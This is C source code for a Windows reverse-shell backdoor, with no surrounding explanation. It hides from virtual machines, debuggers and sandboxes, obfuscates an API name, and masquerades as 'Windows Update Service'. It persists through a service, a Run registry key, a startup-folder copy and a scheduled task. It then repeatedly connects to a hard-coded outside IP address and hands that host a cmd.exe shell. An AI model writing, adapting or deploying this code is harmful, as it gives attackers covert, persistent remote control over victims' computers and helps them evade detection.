#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>
#include <stdio.h>
#include <shlobj.h>

#define DEFAULT_BUFLEN 1024
#define XorKey 0x81
#define SERVICE_NAME "WindowsUpdateService"
#define SERVICE_DISPLAY_NAME "Windows Update Service"
#define REGISTRY_KEY "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
#define REGISTRY_VALUE "WindowsUpdate"

typedef int (WINAPI* WSASTARTUP)(WORD wVersionRequested, LPWSADATA lpWSAData);
typedef SOCKET (WSAAPI* WSASOCKETA)(int af, int type, int protocol, LPWSAPROTOCOL_INFOA lpProtocolInfo, GROUP g, DWORD dwFlags);
typedef unsigned long (WINAPI* myINET_ADDR)(const char *cp);
typedef u_short(WINAPI* myHTONS)(u_short hostshort);
typedef int (WSAAPI* WSACONNECT)(SOCKET s, const struct sockaddr *name, int namelen, LPWSABUF lpCallerData, LPWSABUF lpCalleeData, LPQOS lpSQOS, LPQOS lpGQOS);
typedef int (WINAPI* CLOSESOCKET)(SOCKET s);
typedef int (WINAPI* mySEND)(SOCKET s, const char *buf, int len, int flags);
typedef int (WINAPI* WSACLEANUP)(void);

// Service related typedefs
typedef SC_HANDLE (WINAPI* OPENSCMANAGERA)(LPCSTR, LPCSTR, DWORD);
typedef SC_HANDLE (WINAPI* CREATESERVICEA)(SC_HANDLE, LPCSTR, LPCSTR, DWORD, DWORD, DWORD, DWORD, LPCSTR, LPCSTR, LPDWORD, LPCSTR, LPCSTR, LPCSTR);
typedef BOOL (WINAPI* CLOSESERVICEHANDLE)(SC_HANDLE);
typedef LONG (WINAPI* REGSETVALUEEXA)(HKEY, LPCSTR, DWORD, DWORD, const BYTE*, DWORD);
typedef LONG (WINAPI* REGOPENKEYEXA)(HKEY, LPCSTR, DWORD, REGSAM, PHKEY);
typedef LONG (WINAPI* REGCLOSEKEY)(HKEY);

// Global variables for service
SERVICE_STATUS g_ServiceStatus = {0};
SERVICE_STATUS_HANDLE g_StatusHandle = NULL;
HANDLE g_ServiceStopEvent = INVALID_HANDLE_VALUE;

void xor(char *inputString, int inputLen, char** outputString) {
    *outputString = (char*)calloc(inputLen+1, sizeof(char));
    for (int i = 0; i < inputLen; i++) {
        (*outputString)[i] = inputString[i] ^ XorKey;
    }
}

// Anti-analysis functions
BOOL IsVirtualMachine() {
    SYSTEM_INFO sysInfo;
    GetSystemInfo(&sysInfo);
    if (sysInfo.dwNumberOfProcessors < 2) return TRUE;
    
    MEMORYSTATUSEX memInfo;
    memInfo.dwLength = sizeof(memInfo);
    GlobalMemoryStatusEx(&memInfo);
    if (memInfo.ullTotalPhys < 2147483648) return TRUE;
    
    return FALSE;
}

BOOL IsDebugged() {
    if (IsDebuggerPresent()) return TRUE;
    
    BOOL isDebuggerPresent = FALSE;
    CheckRemoteDebuggerPresent(GetCurrentProcess(), &isDebuggerPresent);
    if (isDebuggerPresent) return TRUE;
    
    return FALSE;
}

BOOL IsSandboxed() {
    if (GetModuleHandleA("SbieDll.dll") || 
        GetModuleHandleA("dbghelp.dll") ||
        GetModuleHandleA("api_log.dll") ||
        GetModuleHandleA("dir_watch.dll")) {
        return TRUE;
    }
    
    if (FindWindowA("OLLYDBG", NULL) ||
        FindWindowA("IDA", NULL) ||
        FindWindowA("Wireshark", NULL) ||
        FindWindowA("Process Monitor", NULL)) {
        return TRUE;
    }
    
    return FALSE;
}

void AntiAnalysis() {
    if (IsVirtualMachine() || IsDebugged() || IsSandboxed()) {
        ExitProcess(0);
    }
    
    if (GetTickCount() < 300000) {
        ExitProcess(0);
    }
    
    Sleep(1000);
    if (GetTickCount() < 301000) {
        ExitProcess(0);
    }
}

// Persistence functions
void InstallService() {
    SC_HANDLE schSCManager = NULL;
    SC_HANDLE schService = NULL;
    TCHAR szPath[MAX_PATH];
    
    if (GetModuleFileName(NULL, szPath, MAX_PATH) == 0) return;
    
    HMODULE h_advapi32 = LoadLibraryA("advapi32.dll");
    if (!h_advapi32) return;
    
    OPENSCMANAGERA t_OpenSCManager = (OPENSCMANAGERA)GetProcAddress(h_advapi32, "OpenSCManagerA");
    CREATESERVICEA t_CreateService = (CREATESERVICEA)GetProcAddress(h_advapi32, "CreateServiceA");
    CLOSESERVICEHANDLE t_CloseServiceHandle = (CLOSESERVICEHANDLE)GetProcAddress(h_advapi32, "CloseServiceHandle");
    
    if (!t_OpenSCManager || !t_CreateService || !t_CloseServiceHandle) {
        FreeLibrary(h_advapi32);
        return;
    }
    
    schSCManager = t_OpenSCManager(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
    if (schSCManager == NULL) {
        FreeLibrary(h_advapi32);
        return;
    }
    
    schService = t_CreateService(
        schSCManager,
        SERVICE_NAME,
        SERVICE_DISPLAY_NAME,
        SERVICE_ALL_ACCESS,
        SERVICE_WIN32_OWN_PROCESS,
        SERVICE_AUTO_START,
        SERVICE_ERROR_NORMAL,
        szPath,
        NULL,
        NULL,
        NULL,
        NULL,
        NULL
    );
    
    if (schService) {
        t_CloseServiceHandle(schService);
    }
    t_CloseServiceHandle(schSCManager);
    FreeLibrary(h_advapi32);
}

void AddStartupRegistry() {
    HKEY hKey;
    TCHAR szPath[MAX_PATH];
    
    if (GetModuleFileName(NULL, szPath, MAX_PATH) == 0) return;
    
    HMODULE h_advapi32 = LoadLibraryA("advapi32.dll");
    if (!h_advapi32) return;
    
    REGOPENKEYEXA t_RegOpenKeyEx = (REGOPENKEYEXA)GetProcAddress(h_advapi32, "RegOpenKeyExA");
    REGSETVALUEEXA t_RegSetValueEx = (REGSETVALUEEXA)GetProcAddress(h_advapi32, "RegSetValueExA");
    REGCLOSEKEY t_RegCloseKey = (REGCLOSEKEY)GetProcAddress(h_advapi32, "RegCloseKey");
    
    if (!t_RegOpenKeyEx || !t_RegSetValueEx || !t_RegCloseKey) {
        FreeLibrary(h_advapi32);
        return;
    }
    
    if (t_RegOpenKeyEx(HKEY_CURRENT_USER, REGISTRY_KEY, 0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
        t_RegSetValueEx(hKey, REGISTRY_VALUE, 0, REG_SZ, (BYTE*)szPath, strlen(szPath) + 1);
        t_RegCloseKey(hKey);
    }
    
    FreeLibrary(h_advapi32);
}

void AddStartupFolder() {
    TCHAR szPath[MAX_PATH];
    TCHAR szStartupPath[MAX_PATH];
    
    if (GetModuleFileName(NULL, szPath, MAX_PATH) == 0) return;
    
    if (SUCCEEDED(SHGetFolderPath(NULL, CSIDL_STARTUP, NULL, 0, szStartupPath))) {
        TCHAR szDestPath[MAX_PATH];
        wsprintf(szDestPath, "%s\\%s", szStartupPath, "WindowsUpdate.exe");
        CopyFile(szPath, szDestPath, FALSE);
    }
}

void AddScheduledTask() {
    TCHAR szPath[MAX_PATH];
    if (GetModuleFileName(NULL, szPath, MAX_PATH) == 0) return;
    
    char taskXML[] = 
        "<?xml version=\"1.0\" encoding=\"UTF-16\"?>\n"
        "<Task version=\"1.2\" xmlns=\"http://schemas.microsoft.com/windows/2004/02/mit/task\">\n"
        "  <RegistrationInfo>\n"
        "    <Description>Windows Update Task</Description>\n"
        "  </RegistrationInfo>\n"
        "  <Triggers>\n"
        "    <LogonTrigger>\n"
        "      <Enabled>true</Enabled>\n"
        "    </LogonTrigger>\n"
        "  </Triggers>\n"
        "  <Principals>\n"
        "    <Principal id=\"Author\">\n"
        "      <RunLevel>HighestAvailable</RunLevel>\n"
        "    </Principal>\n"
        "  </Principals>\n"
        "  <Settings>\n"
        "    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>\n"
        "    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>\n"
        "    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>\n"
        "    <AllowHardTerminate>false</AllowHardTerminate>\n"
        "    <StartWhenAvailable>true</StartWhenAvailable>\n"
        "    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>\n"
        "  </Settings>\n"
        "  <Actions Context=\"Author\">\n"
        "    <Exec>\n"
        "      <Command>%s</Command>\n"
        "    </Exec>\n"
        "  </Actions>\n"
        "</Task>";
    
    char finalXML[2048];
    wsprintf(finalXML, taskXML, szPath);
    
    TCHAR szTempPath[MAX_PATH];
    GetTempPath(MAX_PATH, szTempPath);
    TCHAR szXMLPath[MAX_PATH];
    wsprintf(szXMLPath, "%s\\task.xml", szTempPath);
    
    HANDLE hFile = CreateFile(szXMLPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile != INVALID_HANDLE_VALUE) {
        WriteFile(hFile, finalXML, strlen(finalXML), NULL, NULL);
        CloseHandle(hFile);
        
        char cmdLine[MAX_PATH + 50];
        wsprintf(cmdLine, "schtasks /create /tn \"WindowsUpdate\" /xml \"%s\" /f", szXMLPath);
        WinExec(cmdLine, SW_HIDE);
        
        DeleteFile(szXMLPath);
    }
}

void RunShell(char* C2Server, int C2Port) {
    AntiAnalysis();
    
    HMODULE h_ws2_32 = LoadLibraryA("ws2_32");

    unsigned char s_WSAStartup[] = { 0xd6, 0xd2, 0xc0, 0xd2, 0xf5, 0xe0, 0xf3, 0xf5, 0xf4, 0xf1, };
    char *ds_WSAStartup = NULL;
    xor(s_WSAStartup, 10, &ds_WSAStartup);
    WSASTARTUP t_WSASTARTUP = (WSASTARTUP)GetProcAddress(h_ws2_32, ds_WSAStartup);
    free(ds_WSAStartup);

    WSASOCKETA t_WSASOCKETA = (WSASOCKETA)GetProcAddress(h_ws2_32, "WSASocketA");
    myINET_ADDR t_myINET_ADDR = (myINET_ADDR)GetProcAddress(h_ws2_32, "inet_addr");
    myHTONS t_myHTONS = (myHTONS)GetProcAddress(h_ws2_32, "htons");
    WSACONNECT t_WSACONNECT = (WSACONNECT)GetProcAddress(h_ws2_32, "WSAConnect");
    CLOSESOCKET t_CLOSESOCKET = (CLOSESOCKET)GetProcAddress(h_ws2_32, "closesocket");
    WSACLEANUP t_WSACLEANUP = (WSACLEANUP)GetProcAddress(h_ws2_32, "WSACleanup");
    mySEND t_mySEND = (mySEND)GetProcAddress(h_ws2_32, "send");

    while(TRUE) {
        SOCKET mySocket;
        struct sockaddr_in addr;
        WSADATA version;
        t_WSASTARTUP(MAKEWORD(2,2), &version);
        mySocket = t_WSASOCKETA(AF_INET, SOCK_STREAM, IPPROTO_TCP, 0, 0, 0);
        addr.sin_family = AF_INET;
   
        addr.sin_addr.s_addr = t_myINET_ADDR(C2Server);
        addr.sin_port = t_myHTONS(C2Port);

        if (t_WSACONNECT(mySocket, (SOCKADDR*)&addr, sizeof(addr), 0, 0, 0, 0)==SOCKET_ERROR) {
            t_CLOSESOCKET(mySocket);
            t_WSACLEANUP();
            Sleep(5000);
            continue;
        }
        else {
            CHAR init[] = "GET /index.html HTTP/1.1\r\n\r\n";
            INT initlen = strlen(init);
            t_mySEND(mySocket, init, initlen, 0);
            char Process[] = "cmd.exe";
            STARTUPINFO sinfo;
            PROCESS_INFORMATION pinfo;
            memset(&sinfo, 0, sizeof(sinfo));
            sinfo.cb = sizeof(sinfo);
            sinfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
            sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError = (HANDLE) mySocket;
            CreateProcess(NULL, Process, NULL, NULL, TRUE, 0, NULL, NULL, &sinfo, &pinfo);
            WaitForSingleObject(pinfo.hProcess, INFINITE);
            CloseHandle(pinfo.hProcess);
            CloseHandle(pinfo.hThread);
        }
        Sleep(5000);
    }
}

int main(int argc, char **argv) {
    FreeConsole();
    
    // Install persistence mechanisms
    InstallService();
    AddStartupRegistry();
    AddStartupFolder();
    AddScheduledTask();
    
    if (argc == 3) {
        int port = atoi(argv[2]);  
        RunShell(argv[1], port);
    }
    else {
        char host[] = "165.227.81.186";
        int port = 9000;
        RunShell(host, port);
    }
    return 0;
}